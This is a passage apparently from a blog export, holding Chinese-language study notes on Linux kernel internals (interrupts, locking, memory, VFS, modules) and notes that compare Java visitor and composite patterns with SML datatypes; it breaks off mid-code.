cxt\n會睡覺\n會被搶\n\n\n在你想多加一個syscall(衝動)之前，可以\n\n用dev file實現read, write，配合ioctl\n創其他操作介面，像semaphore可以像file一樣操作\nsysfs\n\n\n\nch6\nlist_elment\n\n在&lt;linux/list.h&gt;\nLinked List (bidiretion)\n用法是在自己的struct中放一個list_elment\n\n因為c沒泛型!!\nc應該叫mem描述語言才對\n\n\n沒有特別需求時優先用list\n\nkfifo\n\n在&lt;linux/kfifo.h&gt;\nQueue\n遇到 consumer/producer時用\n\nidr\n\n在&lt;linux/idr.h&gt;\nHash table\n\nuid(int) -&gt; void *\n\n\n要mapping時就用\n\nrbtree\n\n在&lt;linux/rbtree.h&gt;\n紅黑樹\n沒有find與insert，要自己寫\n\n因為c沒泛型!!\n\n\n大量data與反覆search就用\n\nch7\n中斷(IRQ)\n\n就是一個數字\n異常與中斷很像\n\n但異常要與cpu時鐘同步\n\n\n\n中斷上下文\n\n不會block(睡覺)\n當他出現時，一定是\n\n打斷了某個proc\n甚至是，不同irq stack的irq\n\n\n\n上半段 與 下半段\n\n上半段: 馬上處理\n下半段: 原本中斷中可以之後再處理的\n\nrequest_irq\n\n註冊irq\n會sleep\n\nreenter?\n\nirq被call時，該irq會被mask起來，其他cpu看不到\n\nIRQF_SHARED\n\n多個dev用同一個irq\n所以\n\ndev的addr唯一，也就是可以區分不同device\ncode有辦法對應不同device\n\n\n\n/procs/interrupts\n\nPC上所有irq的資訊\n\n中斷控制器\n\n停用\n\ncpu上的整個中斷\n\n這樣這個cpu上就不會被preempt\n但其他cpu還是可以中斷!!\n\n\n所有cpu的某個中斷\n\n\n看&lt;asm/system.h&gt;與&lt;asm/irq.h&gt;\n\nch8\n中斷，下半段\nsoftirq\n\n同一個softirq可以同時跑在其他cpu上\n靜態註冊 (compile-time)\n\n在&lt;linux/interrupt.h&gt;\n\nstruct softirq_action\n\n\nsoftirq放在array中(32個)\n\n\n中斷上下文\nsoftirq沒辦法搶其他的softirq\n\nsoftirq只會被irq搶!!\n\n\n跑什麼softirq\n\nirq handler在return前會標\n\n\n什麼時候跑softirq?\n\nirq handler在return時\n在softirqd中\n有人去看還有哪些softirq還沒跑與直接執行softirq的時候\n\n\n\ntasklet\n\n同一個tasklet不可以同時跑在其他cpu上\n動態註冊\n\n在&lt;linux/interrupt.h&gt;\n\nstruct tasklet_struct\n有執行狀態\n\n所以其他cpu不會跑正在跑的tasklet\n\n\n\n\ntasklet放在cpu上的linked list\n\ntasklet_vec\ntasklet_hi_vec (hi是high)\n所以可以動態加\n\n\n\n\n中斷上下文\ntasklet就是掛在兩個softirq上\n\n把task往裡面放，需要時就跑\n\n\n\nksoftirqd\n\n每個cpu上會有一個\n處理大量softirq\n\n在最低nice的kthread中去調用還沒跑的softirq\n\n\n\nwork queue\n\nproc上下文\n\n可以allocate大mem\nsemaphore\n用block IO\n\n\n每個cpu一個queue與kthread，跑task\n\n我們需要一個可以看到所有cpu的struct\n\n在&lt;linux/workqueue.h&gt;\n\nstruct workqueue_struct\n\n放workqueue訊息\n\n\n\n\nproc叫event/n\n\n在&lt;kernel/workqueue.c&gt;\n\nstruct cpu_workqueue_struct\n\n就是queue\n\n\n\n\n在&lt;linux/workqueue.h&gt;\n\nstruct work_struct\n\n就是task\n\n\n\n\n每個cpu上會有一個\nn是cpu編號\n\n\n\n\n\n\n\nhow to lock\n\nproc cxt與bottom half分享data\n\n鎖bottom half\n拿鎖\n\n\nirq cxt與bottom half分享data\n\n鎖irq\n拿鎖\n\n\nirq -&gt; softirq/tasklet -&gt; proc\n\n如果要和上一層share data\n\n鎖上一層!!\n\n防smp與preempt\n\n\n拿鎖\n\n\n可以看Unreliable Guide To Locking有詳細的解釋\n\n\n\nch9&amp;10\n怎麼等鎖\n\nbusy waiting\n\n都能用\n\n\nsleep\n\nonly in proc ctx\n\n\n\n要同步的原因是\n\nin userspace\npreempt\nre schedule\nin kernel space\n\nirq\nsoftirq/tasklet\npreempt\nsleep &amp; sync with userspace\nsmp\n\n\n\nstruct什麼時候加鎖\n\nkernel struct大部分都要\n有其他proc可以access\n任何人都看的到的\n\n原子性與順序性\n\n原子性\n\n執行期間不打斷，只有兩個case\n\n沒有跑\n跑完了\n\n\n\n\n順序性\n\nABC分散在不同中，也要ABC去跑\n\n用lock只能保證，ABC一起跑，一起不跑\n用semaphore可以幹出來\n主要用barrier\n\n\n\n\n\n讀寫鎖(RW)\n\n只能有下面的其中一種case\n\n1寫\n多讀\n\n\n有利於讀\n\n只要一堆讀，寫就只要等就飽了\n\n\n\n工具\n\natomic_t\nspinlock\n\nbusy waiting\n\n使用時不能sleep\n不然就是增加整體的response time\n\n\n如果lock時間小於2次ctx switch才有利\nno recur\n\n不能鎖了又鎖\n\n\n在irq中用的話\n\n先關irq\n不然被中斷，另一irq又拿同一個鎖的話…\n\n\n有RW版\n禁止preempt\n\n持有spinlock就是禁止preempt\n\n\n\n\nsemaphore\n\nsleep\n\nonly in proc ctx\n\n\n任何持有人都可以上鎖或解鎖!!\n可以超過一個人到critical zone\n有RW版\n\n\nmutex\n\nsleep\n\nonly in proc ctx\n\n\n上鎖的人才能解鎖\n只有一個人能到critical zone\n可以recur\n可以處理priority inversion\n\n\ncomplete variable\n\ncond var\n\n\nseq lock\n\n實作\n\n有一個acc\n當write拿鎖時，會acc++\nread時就是確認開始與結束的acc值是不是一樣\n\n確認中間沒有write\n\n\n也可以透過acc是不是偶數看寫結束語否\n\n\n有利於寫\n\n\nmem barrier\n\nbarrier前面的code跑完前，絕對不會跑後面去\n起因於\n\n指令重排，所以有些指令會跑到後面去\n前半部的code不會到reorder到後面去\n\n\n\n\n\npriority inversion\n\n一般來說是在RT才會提，但想到就記一下\n情境\n\npri最小(A)拿到lock中被中斷\npri高的(C)想拿lock，但拿不到!!\n\n像spinlock會busy waiting\n\n\npri高的跑不動，time slice吃完\n有下一個pri比較低的(B)，來了，也做完了!?\n但pri高的還沒做完阿!!\n\n\n起因\n\nlock的效果會影響優先權，但是沒有納入原有優先權的系統中\n\n像只要有人拿了spiclock，那他在這一塊就是最優先的\n不管其他優先權怎麼設，bust waiting就是wait，沒有轉圜的機會\n同時也無法打斷，不然就不是crtical zone了\n\n\n\n\n解法\n\n大方向: crtical zone要先跑!!\n\n要改crtical zone的優先權\n\n改到與現在最高的一樣高\n改到沒有人比crtical zone高\n\n\n\n\nPriority inheritance\n\n在crtical zone時，遇到更高的proc同時要進來\n把crtical zone的優先權拉到與那個proc一樣高\n跑完crtical zone就降回去\n\n\nPriority ceiling protocol\n\n在crtical zone時拉到最高\n跑完crtical zone就降回去\n\n\n\n\n\nch11\n怎麼算1秒\n\n系統計時器會依一定頻率(tick rate)打中斷\n\n這樣kernel知道兩次中斷之間的間隔時間(tick)\n\n\nHZ就是1sec打幾次\n\nHZ可以改!!\nHZ越高\n\n時間精準度越高\n\n連帶與時間有關的都會變準\n\npoll, select\npreempt\n\n\n\n\nsystem load上升\n\n\n這是kernel用的\n\nuserspace的叫USER_HZ\n\n\n\n\n1sec = tick * HZ\n\n開機多久了\n\njiffies\n\n紀錄系統計時器中斷打了幾次\n\n\njiffies/HZ =&gt; 開機多久\n\n硬體\n\nRTC\n\nbios上存時間(幾點幾分之類的)的\n就算電腦關機，還是藉由CMOS繼續跑\n開機時初始化xtime變數\n\n\n系統計時器\n\n由kernel設定tick rate\n\n\n\n關於proc的計時\n\n每一次中斷時就把當前proc狀態(idle, run…)的變數遞增一次\n\n如果在這中斷之間多次換狀態?\n\n不管，現在他在這個狀態，這一段時間都是這個狀態的\n\n\n\n\n\n如何delay\ndelay執行，不應該在有lock時或是關閉中斷後發生\n\nbusy wait\n\nbase on jiffies\n\n\nshort delay\n\n如果要的delay比tick小\n用udelay(),ndelay(),mdelay()\n\n裡面其實也是loop，但是kernel知道他會跑多久且不用jiffies\n\n\n\n\nschedule_timeout()\n\n讓task睡，在超過指定時間後跑\n\n沒辦法說很精確在時間到就馬上跑\n\n\nsoft rt\n\n\n\nch12\nkernel space的mem\n整體\n\nphy\n\nmem\n\nbyte\nword\n\n\ncpu\n\npage\n\n\n\n\nkernel\n\nstruct zone\n\n在&lt;linux/mmzone.h&gt;\nstruct page\n\n在&lt;linux/mm_types.h&gt;\n對應到實體的page\n再從page換成addr\n\nalloc_pages -&gt; page_address\nkmalloc\n\n不能要求ZONE_HIGHEM\n\n因為可能還沒分配邏輯addr\n用alloc_pages\n\n\n\n\n上面都是\n\n連續的page\n可以sleep時用GFP_KERNEL\n不可以sleep時用GFP_ATOMIC\n\n\nvmalloc\n\n可能不連續的page\n\n\n\n\n\n\n不同page在不同位置，所以有不同區\n4種\n\nZONE_DMA\nZONE_DMA32\n\nonly for 32bits device\n\n\nZONE_NORMAL\nZONE_HIGHEM\n\nhigh mem用，不能用永久map到kernel addr空間\n想想kernel都是用低的mem，所以高的其實算是userspace的\n\n如果要用就要map\n\n永久: kmap (low與high都能用，會睡覺)\n臨時: kmap_atomic (不會睡，但是會被下一個)\n\n\n\n\n\n\n\n\n\n\nslab\n\n在快取記憶體上(kmem_cache)開一個list當成object pool\n\n之後重複利用裡面已經存在的obj\nslab就是list上的node，node裡面放obj\n\n\nstruct slab\n\n在&lt;mm/slab.c&gt;\n\n\n\n\n\n\n\n額外\n\nstack\n\n每個proc有\n\nkernel stack\n\n1~2 page (根據arch)\n原本中斷也是用被中斷的proc的stack\nkernel stack本來就很小，還是別吧\n\n最後有了interrupt stack\n\n\n\n\nuser stack\n\n就一般的stack\nkernel stack是為了與user stack分開\n想想兩個混在一起會發生什麼事\n\n\n\n\n每個cpu有\n\ninterrupt stack\n\n\n\n\npercpu\n\n每個cpu自己的data\n因為是cpu自己的，所以\n\ncache失效降低\n不用擔心smp\n\npreempt還是要怕\n\n\n\n\n\n\n\nch15\nuser space的mem\n整體\n\nproc的userspace的mem空間\n\nstruct mm_struct\n\n在&lt;linux/sched.h&gt;\n可以到/proc/&lt;pid&gt;/maps看proc現在有什麼\n主要兩個\n\nstruct vm_area_struct\n\n在&lt;linux/mm_types.h&gt;\n就是這裡的page，加上權限與狀態之類的\n在mm_struct有兩個obj放vm_area_struct\n\nlist: 方便iterate\nrbtree: 方便找定點\n\n\n\n\npgd_t\n\nphy的page表\n\n三層 (pgd -&gt; pmd -&gt; pte)\n\n\n用這個換出實際addr\n\n\n\n\n\n\n\n\n\n額外\n\nkthread的mm\n\nkthread天生沒有mm (不然怎麼有k)\n當需要的時候會從proc的ptr拿到\n\n當schedule會存前一個proc的mm (active_mm)\n當kthread需要(像page table)，就直接用active_mm看\n\n\n\n\nmmap\n\n把file放到proc的userspace的mem空間\n\n生一個addr出來\n\n\n\n\n\nch13\nvirtual file system的流程\n\nuserspace\nvirtual file system\n真的file system\nphy\n\nVFS的attribute\n\nsuperblock\n\n真的file system (ext4, brtfs…)\n\nstruct file_system_type\n\n在&lt;linux/fs.h&gt;\n放fs的訊息(kernel關心的)\n\n\nstruct vfsmount\n\n在&lt;linux/mount.h&gt;\nfs的統計數據與安裝訊息(root, dev等等)與安裝點\n\n可以當成實際fs的入口\n\n\n\n\n\n\n放fs的訊息(VFS關心的)\nstruct super_block\n\n在&lt;linux/fs.h&gt;\n\n\n\n\ninode\n\nfile or folder\n放file/folder的訊息\nstruct inode\n\n在&lt;linux/fs.h&gt;\n\n\n\n\ndentry\n\npath的一部份\n\n/usr/bin/vi的\n\n/, usr, bin, vi\n\n\n其實可以當成inode，但是為了查找path，所以獨立出來\n\n\nstruct dentry\n\n在&lt;linux/dcache.h&gt;\n\n\nstate\n\n被用\n\n有對應的file\n也正在被ref\n\n\n還沒被用\n\n有對應的file\n沒被ref\n\n\n不在\n\n根本沒這個file\n\n總不能每次要等整個找完才丟沒有指定的檔案吧\n同時，因為有這個與slab，在之後真的有檔案也可以直接快取\n\n\n\n\n\n\n\n\nfile\n\nopend file\nstruct file\n\n在&lt;linux/fs.h&gt;\n\n\n\n\n\n看看proc\n\n每個proc都有\n\nstruct files_struct\n\n在&lt;linux/fdtable.h&gt;\n紀錄 開過的檔案\n\n\nstruct fs_struct\n\n在&lt;linux/fs_struct.h&gt;\n紀錄 pwd, 現在跑的檔案\n\n\n\n\n每個namespace都有\n\nstruct mmt_namespace\n\n在&lt;linux/mmt_namespace.h&gt;\n放vfsmount，讓同一namespace的去找\n\n\n\n\n\nch14\nskip\nch16\n快取策略\n\nnowrite\n\n不管cache，直接寫到mem\ncache直接失效\n\n\nwrite-through\n\n同時更新cache與mem\n\n\nwrite back\n\n先更cache\n再找時間更mem\n\n\n\n快取無效策略\n\nLRU\n\n從list中拿掉最少用到的\n\n\nLRU/2\n\n兩條list\n\n熱的\n不熱的\n\n\n變成熱的方式\n\n在不熱的中\n有被用到\n\n\n如何調整兩條list\n\n熱的比不熱的長\n把一些去掉\n\n\n怎麼去掉\n\nfifo (不是最少用到)\n熱的list就是原本LRU中記錄頻率的腳色\n只要在熱的list就是有用過\n\n\n\n\n\npage快取(上一篇心得的file快取)\n\nstruct address_space\n\n在&lt;linux/fs.h&gt;\n應該叫page_cache_entity\n\n\n這是write back\n\n什麼時候寫回去\n\ncache要沒了\ncache放太久了\n有人callsync(),fsync()\n\n\n誰去寫\n\n靠flusher的多thread去寫 (原本是單thread)\n\n但還是會被底下的IO給bound\n\n\n\n\n\n\n\nch17\n編module\nmakefile\nobj-m += foo.o# obj-m += foo.o 加在sourcetree中的makefile中foo-objs := foo-main.o foo-utils.o\n\n編\n\nmake -C /kernel/path SUBDIRS=$PWD modules\n\n\n安裝\n\nmake modules_install\n\n\n生相依訊息\n\ndepmod\ndepmod -A only for new added modules\n\n\n加編譯選項\n\n改Kconfig\n\n\n\nexport what?\n\n參數\n\nstatic int a = 1;\nmodule_param_named(exported_name, a, int, 0644);\n\n\nsymbol table\n\nEXPORT_SYMBOL(your_func);\nEXPORT_SYMBOL_GPL(your_func);\n\n\n\ndevice model &amp; sysfs\n\ndevice model\n\n\nstruct kobject\n\n在&lt;linux/kobject.h&gt;\n就是obj\n與list一樣要嵌到其他struct上才有用\n在sysfs中會變成folder\n\n他的參數會變成file\n\nstruct attribute\n\n在&lt;linux/sysfs.h&gt;\n\n\n會有值，可讀寫\n\nstruct sysfs_ops\n\n在&lt;linux/sysfs.h&gt;\n有read/write可以實作\n\n\n\n\n\n\n\n\n\n\n\nstruct ktype\n\n在&lt;linux/kobject.h&gt;\n就是放methods\n\n\n\nstruct kset\n\n在&lt;linux/kobject.h&gt;\n就是class(obj的base，js的prototype)\n\n\n\n\nsysfs\n\nblock\n\n列出註冊的block dev\n\n\nbus\n\n列出系統的bus\n\n\nclass\n\n列出依func排列的dev\n\nnet, block, ppp, rtc等等\n\n\n\n\ndev\n\n列出註冊的dev\n\nblock, char\n\n\n\n\ndevices\n\n列出dev的topo\n\nplatform, system, virtual等等\n\n\n\n\nfirmware\n\n與系統有關的low-level子系統\n\nACPI, EDD, EFI\n\n\n\n\nfs\n\n列出filesystem\n\n\nkernel\n\n列出kernel狀態與option\n\n\nmodules\n\n列出載入的module\n\n\npower\n\n列出電源管理的資料\n\n\n\n\n\nch18&amp;19\n開發tips\n\n保留一個能動的，一個用新版，其他用舊版\n\n用uid(user)去切\n加個condition\n\n\n加統計量\n限制output的頻率\n\n每個幾秒印一次\n只印幾次\n\n\n輸出自己的錯誤訊息\n\n我自己會在一定看的到的地方(像家目錄)，放log\n\n\n\nalign\n由大到小去排\n// total: 12struct A &#123;  char a; // 1+3  unsigned long b;  // 4+0  unsigned short c; // 2+1+1  char d;&#125;;// total: 8struct B &#123;  unsigned long b; // 4+0  unsigned short c; // 2+1+1  char a;  char d;&#125;;\nbig/little endian\n\n變成binary: 會變成abcd\n最左是最高有效位\nbig-endian: 最高有效位放arr第一個\nlittle-endian: 最低有效位放arr第一個\n\n最高有效位與最低有效位的技法: 下坡(反斜線)，所以最高在左邊\n一些數字\n\n不要假設HZ、page的長度\n沒有寫明長度的type的長度都是不確定的\n\n除了\n\nchar是1byte (ansi c)\nint通常是32位\n\n\n\n\n\nch20\nskip\n","categories":["System","Linux","Reading"]},{"title":"A little java, a few patterns筆記","url":"/2021/07/a-little-java-a-few-patterns-note/","content":"動機\n這已經雪藏很久了，久在github page還沒用到之前就在我的google docs中\n整理一下貼出來\n\nCh1 datatype in Java\nabstract class N &#123;&#125;class Zero extends N &#123;&#125;class AddOne extends N &#123;&#125;\n=&gt;\ndatatype N = Zero | AddOne of N\n就是datatype\nThe First Bit of Advice\nWhen specifying a collection data, use abstract classes for datatypes and extended classes for variants.\nCh2 list recur ( [type] -&gt; bool &amp; [type(‘a)] -&gt; ‘a)\nonlyA\nabstract class Ab &#123;    abstract boolean onlyA();&#125;class Base extends Ab &#123;     boolean onlyA() &#123; return true; &#125;&#125;class B extends Ab &#123;     Ab ab;     B(Ab _ab) &#123; ab = _ab; &#125;     boolean onlyA() &#123; return false; &#125;&#125;class A extends Ab &#123;     Ab ab;     A(Ab _ab) &#123; ab = _ab; &#125;     boolean onlyA() &#123; return ab.onlyA(); &#125;&#125;\nab.&#123;&#123;func&#125;&#125;，在ML中的ab是的參數！！\ndatatype Ab = Base | A of Ab | B of Abfun onlyA(Base) = true    | onlyA(A(ab)) = onlyA(ab)    | onlyA(B(ab)) = false(onlyA : Ab -&gt; bool)\nhold_what\nabstract class Ab &#123;    abstract boolean onlyA();    abstract Object hold_what();&#125;class Base extends Ab &#123;     Object hold;     Base(Object _hold) &#123; hold = _hold; &#125;     Object hold_what() &#123; return hold; &#125;     boolean onlyA() &#123; return true; &#125;&#125;class B extends Ab &#123;     Ab ab;     B(Ab _ab) &#123; ab = _ab; &#125;     boolean onlyA() &#123; return false; &#125;     Object hold_what() &#123; return ab.hold_what; &#125;&#125;class A extends Ab &#123;     Ab ab;     A(Ab _ab) &#123; ab = _ab; &#125;     boolean onlyA() &#123; return ab.onlyA(); &#125;     Object hold_what() &#123; return ab.hold_what; &#125;&#125;\ndatatype ‘a Ab = Base of ‘a | A of Ab | B of Abfun hold_what(Base(x)) = x    | hold_what(A(ab)) = hold_what(ab)    | hold_what(B(ab)) = hold_what(ab)(hold_what : ‘a Ab -&gt; ‘a)\nThe Second Bit of Advice\nWhen writing a function over a datatype, place a method in each of the variants that make up the datatype. If a field of a variant belongs to the same datatype, the method may call the corresponding method of the field in computing the function.\ntemplate method pattern\nabstract class Point &#123;     abstract boolean closerTo(Point p);     abstract int dist();&#125; class C extends Point &#123;     int x,y;     C(int x,int y) &#123; x = x; y= y;&#125;     boolean colserTo(Point p) &#123; return dist() &lt;= p.dist(); &#125;     int dist() &#123; return abs(sqrt(x*x+y*y)); &#125;&#125;class M extends Point &#123;     int x,y;     C(int x,int y) &#123; x = x; y= y;&#125;     boolean colserTo(Point p) &#123; return dist() &lt;= p.dist(); &#125;     int dist() &#123; return x+y; &#125;&#125;\n可以把相同的抽到abstract放著\nabstract class Point &#123;     boolean closerTo(Point p) &#123; return dist() &lt;= p.dist(); &#125;     abstract int dist(); // template，template method pattern&#125;\nmy tip\n在所有variant都一樣的function，可以放到abstract class\nCh3 list recur ([type] -&gt; [type])\nremA\nabstract class Ab &#123;    abstract Ab remA();&#125;class Base extends Ab &#123;     Ab remA() &#123; return new Base(); &#125;&#125;class B extends Ab &#123;     Ab ab;     B(Ab _ab) &#123; ab = _ab; &#125;     Ab remA() &#123; return new B(ab.remA()); &#125;&#125;class A extends Ab &#123;     Ab ab;     A(Ab _ab) &#123; ab = _ab; &#125;     Ab remA() &#123; return ab.remA(); &#125;&#125;\ndatatype Ab = Base | A of Ab | B of Abfun remA(Base) = Base    | remA(A(ab)) = remA(ab)    | remA(B(ab)) = B(remA(ab))(remA : Ab -&gt; Ab)\nappB\nabstract class Ab &#123;    abstract Ab remA();    abstract Ab appB();&#125;class Base extends Ab &#123;     Ab remA() &#123; return new Base(); &#125;     Ab appB() &#123; return new Base(); &#125;&#125;class B extends Ab &#123;     Ab ab;     B(Ab _ab) &#123; ab = _ab; &#125;     Ab remA() &#123; return new B(ab.remA()); &#125;     Ab appB() &#123; return new B(ab.appB()); &#125;&#125;class A extends Ab &#123;     Ab ab;     A(Ab _ab) &#123; ab = _ab; &#125;     Ab remA() &#123; return ab.remA(); &#125;     Ab appB() &#123; return new B(new A(ab.appB())); &#125;&#125;\n(這還需要翻成ML嗎)\n如果 appB().remA()，其實與replace A成B是一樣的所以\nrepA\nabstract class Ab &#123;    abstract Ab repA();&#125;class Base extends Ab &#123;     Ab repA() &#123; return new Base(); &#125;&#125;class B extends Ab &#123;     Ab ab;     B(Ab _ab) &#123; ab = _ab; &#125;     Ab repA() &#123; return new B(ab.repA()); &#125;&#125;class A extends Ab &#123;     Ab ab;     A(Ab _ab) &#123; ab = _ab; &#125;     Ab repA() &#123; return new B(ab.repA()); &#125;&#125;\nThe Third Bit of Advice\nWhen writing a function that returns values of a datatype, use new to create these values.\ncomposite &amp; interpreter pattern\nabstract class PizzaD &#123;    abstract PizzaD remA();    abstract PizzaD topAwC();    abstract PizzaD subAbC();&#125;class Crust extends PizzaD &#123;    PizzaD subAbC()&#123;        return new Crust();    &#125;    PizzaD topAwC()&#123;        return new Crust();    &#125;    PizzaD subAbC()&#123;        return new Crust();    &#125;&#125;class Cheese extends PizzaD &#123;    PizzaD p;    Cheese (PizzaD _p) &#123;        p = _p;    &#125;    PizzaD remA()&#123;        return new Cheese(p.remA());    &#125;    PizzaD topAwC()&#123;        return new Cheese(p.topAwC());    &#125;    PizzaD subAbC()&#123;        return new Cheese(p.subAbC());    &#125;&#125;class Olive extends PizzaD &#123;    PizzaD p;    Olive (PizzaD _p) &#123;        p = _p;    &#125;    PizzaD remA()&#123;        return new Olive(p.remA());    &#125;    PizzaD topAwC()&#123;        return new Olive(p.topAwC());    &#125;    PizzaD subAbC()&#123;        return new Olive(p.subAbC());    &#125;&#125;class Anchovy extends PizzaD &#123;    PizzaD p;    Anchovy (PizzaD _p) &#123;        p = _p;    &#125;    PizzaD remA()&#123;        return p.remA();    &#125;    PizzaD topAwC()&#123;        return new Cheese(new Anchovy(p.topAwC()));    &#125;    PizzaD subAbC()&#123;        return new Cheese(p.subAbC());    &#125;&#125;class Sausage extends PizzaD &#123;    PizzaD p;    Sausage (PizzaD _p) &#123;        p = _p;    &#125;    PizzaD remA()&#123;        return new Sausage(p.remA());    &#125;    PizzaD topAwC()&#123;        return new Sausage(p.topAwC());    &#125;    PizzaD subAbC()&#123;        return new Sausage(p.subAbC());    &#125;&#125;\n這兩個pattern的本質是都是自己嵌套自己的datatype，所以可以達成如同list效果，可以無限嵌套來組合\nCh4 pattern match ver1(pass all args by myself &amp; func in abstract class)\n從Java到SML?\n先複習onlyA\nabstract class Ab &#123;    abstract boolean onlyA();&#125;class Base extends Ab &#123;     boolean onlyA() &#123; return true; &#125;&#125;class B extends Ab &#123;     Ab ab;     B(Ab _ab) &#123; ab = _ab; &#125;     boolean onlyA() &#123; return false; &#125;&#125;class A extends Ab &#123;     Ab ab;     A(Ab _ab) &#123; ab = _ab; &#125;     boolean onlyA() &#123; return ab.onlyA(); &#125;&#125;\n接著改寫成像ML的樣子，把所有動作都放到同一個地方\nclass OnlyA &#123; // closure!! OR visitor     boolean forBase() &#123; return true; &#125;     boolean forA(Ab ab) &#123; return ab.onlyA(); &#125;     boolean forB(Ab ab) &#123; return false; &#125;&#125;\ndatatype Ab = Base | A of Ab | B of Abfun onlyA(Base) = true    | onlyA(A(ab)) = onlyA(ab)    | onlyA(B(ab)) = false(onlyA : Ab -&gt; bool)\n這下把執行動作從variant分離出來了．\n但這要怎麼用？？\n如果這closure固定在一個所有variant可以碰到的地方的話\nvisitor (first try)\nabstract class Ab &#123;    OnlyA func = new OnlyA();    abstract boolean onlyA();&#125;class Base extends Ab &#123;     boolean onlyA() &#123; return func.forBase(); &#125;&#125;class B extends Ab &#123;     Ab ab;     B(Ab _ab) &#123; ab = _ab; &#125;     boolean onlyA() &#123; return func.forB(ab); &#125;&#125;class A extends Ab &#123;     Ab ab;     A(Ab _ab) &#123; ab = _ab; &#125;     boolean onlyA() &#123; return func.forA(ab); &#125;&#125;\nThe Fourth Bit of Advice\nWhen writing several functions for the same self-referential datatype, use visitor protocols so that all methods for a function can be found in a single class.\nCh5 equal!?(match self-defined type) &amp; object as type var\n原本應該要用equals去幹一個，但我懶所以用Integer\nclass Rem1 &#123;     IntList forNull() &#123; return new Null(); &#125;     IntList forCons(IntList l, Object i) &#123;      if(1.equals(i))        return l.rem1();      else        return new Cons(i,l.rem1());    &#125;&#125;abstract class IntList &#123;      Rem1 func = new Rem1();      abstract IntList rem1();&#125;class Null extends IntList &#123;      IntList rem1() &#123; return func.forNull(); &#125;&#125;class Cons extends IntList &#123;      Integer i;      IntList next;      // …..      IntList rem1() &#123; return func.forCons(next, i); &#125;&#125;\n這裡省略了一個地方，因為我這裡是用integer所以不用override euqals，但是書上是自訂的class(variant)，所以要用equals要自己實作，而相等的條件就是同類的class的實體，所以用instanceof．\nSubstV\nclass SubstV &#123;    PieD forBot(Object n, Object o) &#123;        return new Bot();    &#125;    PieD forTop (Object t, PieD r, Object n, Object o) &#123;        if (o.equals(t))            return new Top(n, r.subst(n, o));        else            return new Top(t, r.subst(n, 0));    &#125;&#125;abstract class PieD &#123;    RemV remFn = new RemV();    SubsbV substFn = new SubstV();    abstract PieD rem(Object o);    abstract PieD subst(Object n, Object o);&#125;class Bot extends PieD &#123;    PieD rem(Object o)&#123;        return remFn.forBot(o);    &#125;    PieD subst(Object n, Object o)&#123;        return substFn.forBot(n, o)    &#125;&#125;class Top extends PieD &#123;    Object t; // type var    PieD r;    Top(Object _t, PieD _r)&#123;        t = _t;        r = _r;    &#125;    PieD rem(Object o)&#123;        return remFn.forTop(t, r, o);    &#125;    PieD subst(Object n, Object o)&#123;        return substFn.forTop(t, r, n, o)    &#125;&#125;\n這是不是與list很像，不過注意到subst的Object n, Object o在遞迴的時候其實不會變，所以應該要把它抽出來，scheme是letrec或curry，ML是curry，那這邊要怎麼做？\nCh6 pattern match ver2 (pass closure to invoker &amp; curry func)\nclass SubstV &#123;    Object n,o;    // ….    PieD forBot() &#123;        return new Bot();    &#125;    PieD forTop (Object t, PieD r) &#123;        if (o.equals(t))            return new Top(n, r.subst(this));        else            return new Top(t, r.subst(this));    &#125;&#125;\n如果照原本的把closure固定在一個所有variant可以碰到的地方的方式，我們沒機會使用我們自己new出來的clousre!!\n從upper class傳closure變成從參數傳\n那要做出一個空間出來！！\nabstract class PieD &#123;    abstract PieD subst(SubstV func);&#125;class Bot extends PieD &#123;    PieD subst(SubstV func)&#123;        return func.forBot();    &#125;&#125;class Top extends PieD &#123;    Object t;    PieD r;    Top(Object _t, PieD _r)&#123;        t = _t;        r = _r;    &#125;    PieD subst(SubstV func)&#123;        return func.forTop(t,r);    &#125;&#125;\n每個closure都是有for…,for…的話可以拉上去變成abstract嗎？\n可以！！ 直接看像是function template，但是當成function type就是PieD -&gt; PieD!!\n所以這其實代表的是function type，與ml越來越像了\ninterface PieI &#123;     PieD forBot();     PieD forTop(Object t,PieD p);&#125;\n(subst : ‘a Pie -&gt; ‘a Pie)\n都抽成interface了，invoke的地方要不要統一一下\n假設我們有許多closure，那每個都要給一個function name在variant的class，等著丟PieI的實體嗎？\n可以設一個invoke(在書上是accept)接收closure，再把需要的參數灌進去．\nabstract class PieD &#123;    abstract PieD invoke(PieI func);&#125;class Bot extends PieD &#123;    PieD invoke(PieI func)&#123;        return func.forBot();    &#125;&#125;class Top extends PieD &#123;    Object t;    PieD r;    Top(Object _t, PieD _r)&#123;        t = _t;        r = _r;    &#125;    PieD invoke(PieI func)&#123;        return func.forTop(t,r);    &#125;&#125;class SubstV &#123;    Object n,o;    // ….    PieD forBot() &#123;        return new Bot();    &#125;    PieD forTop (Object t, PieD r) &#123;        if (o.equals(t))            return new Top(n, r.invoke(this));        else            return new Top(t, r.invoke(this));    &#125;&#125;\n如果clousre有狀態?\n如果是有acc（有狀態的）的函數\nclass LtdSubstV implements PieVisitorI &#123;    int c;    Object n;    Object o;    LtdSubstV(int _c, Object _n, Object _o) &#123;        c = _c;        n = _n;        o = _o;    &#125;    public PieD forBot() &#123;        return new Bot();    &#125;    public PieD forTop(Object t, PieD r) &#123;        if (c == 0)            return new Top(t, r);        else            if (o.equals(t))                return new Top(n, r.accept(this); //這裡的狀態應該改變            else                return new Top(t, r.accept(this));    &#125;&#125;\n那就new一下，畢竟這裡是functional programming\nclass LtdSubstV implements PieVisitorI &#123;    int c;    Object n;    Object o;    LtdSubstV(int _c, Object _n, Object _o) &#123;        c = _c;        n = _n;        o = _o;    &#125;    public PieD forBot() &#123;        return new Bot();    &#125;    public PieD forTop(Object t, PieD r) &#123;        if (c == 0)            return new Top(t, r);        else            if (o.equals(t))                return new Top(n, r.accept(LtdSubstV(c-1, n, o)));            else                return new Top(t, r.accept(this));    &#125;&#125;\nThe sixth Bit of Advice\nWhen the additional consumed values change for a self-referenced use of a visitor, don’t forget to create a new visitor.\nCh7 tree recur &amp; object as type var\ntree走訪\nabstract class TreeD &#123;    abstract boolean accept(bTreeVisitorI ask);    abstract int accept(iTreeVisitorI ask);    abstract TreeD accept(tTreeVisitorI ask);&#125;class Bud extends TreeD &#123;    boolean accept(bTreeVisitorI ask) &#123;        return ask.forBud();    &#125;    int accept(iTreeVisitorI ask) &#123;        return ask.forBud();    &#125;    TreeD accept(tTreeVisitorI ask) &#123;        return ask.forBud();    &#125;&#125;class Flat extends TreeD &#123;    FruitD f;    TreeD t;    Flat(FruitD _f, TreeD _t) &#123;        f = _f;        t = _t;    &#125;    boolean accept(bTreeVisitorI ask) &#123;        return ask.forFlat(f, t);    &#125;    int accept(iTreeVisitorI ask) &#123;        return ask.forFlat(f, t);    